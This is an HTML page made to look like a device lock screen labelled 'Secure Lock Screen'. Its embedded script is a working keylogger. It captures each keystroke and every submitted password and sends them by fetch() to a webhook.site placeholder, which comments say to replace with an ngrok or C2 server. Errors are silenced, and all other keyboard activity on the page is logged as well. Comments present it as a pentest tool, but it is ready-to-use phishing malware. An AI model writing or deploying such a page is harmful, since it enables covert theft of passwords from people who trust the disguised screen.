<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Lock Screen</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .lock-container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 60px 40px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.2);
            max-width: 400px;
            width: 90%;
        }
        
        .lock-icon {
            font-size: 80px;
            margin-bottom: 20px;
            display: block;
        }
        
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            font-weight: 300;
        }
        
        .subtitle {
            opacity: 0.8;
            margin-bottom: 40px;
            font-size: 16px;
        }
        
        .password-input {
            width: 100%;
            padding: 20px;
            font-size: 24px;
            border: none;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.9);
            color: #333;
            text-align: center;
            letter-spacing: 2px;
            margin-bottom: 20px;
            transition: all 0.3s ease;
            font-family: monospace;
        }
        
        .password-input:focus {
            outline: none;
            background: white;
            transform: scale(1.02);
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        .unlock-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .unlock-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 35px rgba(240, 147, 251, 0.4);
        }
        
        .unlock-btn:active {
            transform: translateY(0);
        }
        
        .status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.7;
        }
        
        .unlocked {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            animation: unlockGlow 1s ease-out;
        }
        
        @keyframes unlockGlow {
            0% { transform: scale(0.95); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="lock-container" id="lockScreen">
        <div class="lock-icon">🔒</div>
        <h1>Device Locked</h1>
        <p class="subtitle">Enter your password to unlock</p>
        
        <input 
            type="password" 
            class="password-input" 
            id="passwordInput"
            placeholder="Password"
            maxlength="20"
            autocomplete="off"
        >
        
        <button class="unlock-btn" id="unlockBtn">Unlock</button>
        <div class="status" id="statusMsg">Type password and press Enter or click Unlock</div>
    </div>

    <!-- UNLOCKED SCREEN (hidden by default) -->
    <div class="lock-container unlocked hidden" id="unlockedScreen">
        <div class="lock-icon">✅</div>
        <h1>Unlocked!</h1>
        <p class="subtitle" id="welcomeMsg">Welcome back</p>
        <button class="unlock-btn" onclick="location.reload()">Lock Again</button>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('passwordInput');
            const unlockBtn = document.getElementById('unlockBtn');
            const lockScreen = document.getElementById('lockScreen');
            const unlockedScreen = document.getElementById('unlockedScreen');
            const statusMsg = document.getElementById('statusMsg');
            const welcomeMsg = document.getElementById('welcomeMsg');
            
            let capturedPassword = '';
            const CORRECT_PASSWORD = 'pentest123'; // Change this for your test
            
            // KEYLOGGER - Captures EVERY keystroke in real-time
            passwordInput.addEventListener('keydown', function(e) {
                // Capture keystroke immediately
                capturedPassword += e.key;
                
                // Console logging (visible in DevTools)
                console.log('[KEYLOG] Key:', e.key, 'Session:', capturedPassword);
                
                // Stealth visual feedback during capture
                passwordInput.style.boxShadow = '0 0 15px #ff4444';
                setTimeout(() => {
                    passwordInput.style.boxShadow = '0 0 15px #44ff44';
                    setTimeout(() => passwordInput.style.boxShadow = '', 200);
                }, 100);
                
                // Real-time network exfiltration to your pentest server
                fetch('https://webhook.site/your-unique-id', { // Replace with ngrok/your C2
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        event: 'keystroke',
                        timestamp: new Date().toISOString(),
                        key: e.key,
                        session: capturedPassword,
                        target: 'passwordInput',
                        userAgent: navigator.userAgent
                    })
                }).catch(() => {}); // Silent fail
                
                // Detect submission attempts
                if (e.key === 'Enter') {
                    console.log('[KEYLOG] SUBMIT ATTEMPT - Full password:', capturedPassword);
                    checkPassword(capturedPassword);
                }
            });
            
            // Button click handler (also logs)
            unlockBtn.addEventListener('click', function() {
                console.log('[KEYLOG] Button submit - Full password:', capturedPassword);
                checkPassword(capturedPassword);
            });
            
            // Reset session on focus
            passwordInput.addEventListener('focus', function() {
                capturedPassword = '';
                statusMsg.textContent = 'Session reset - type password';
            });
            
            // Password validation
            function checkPassword(input) {
                statusMsg.textContent = `Checking "${input}"...`;
                
                // Network exfil of full attempt
                fetch('https://webhook.site/your-unique-id', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        event: 'submit',
                        password: input,
                        success: input === CORRECT_PASSWORD,
                        timestamp: new Date().toISOString()
                    })
                });
                
                if (input === CORRECT_PASSWORD) {
                    unlock();
                } else {
                    statusMsg.textContent = '❌ Wrong password - try again';
                    passwordInput.value = '';
                    capturedPassword = '';
                    passwordInput.style.background = '#ff6b6b';
                    setTimeout(() => passwordInput.style.background = 'rgba(255,255,255,0.9)', 500);
                }
            }
            
            function unlock() {
                lockScreen.classList.add('hidden');
                unlockedScreen.classList.remove('hidden');
                welcomeMsg.textContent = `Unlocked with: "${capturedPassword}"`;
                console.log('[SUCCESS] Unlocked with password:', capturedPassword);
            }
            
            // Fallback: Log ALL keyboard activity on page
            document.addEventListener('keydown', function(e) {
                if (e.target !== passwordInput) {
                    console.log('[GLOBAL] Key:', e.key, 'Target:', e.target.tagName);
                }
            });
        });
    </script>
</body>
</html>
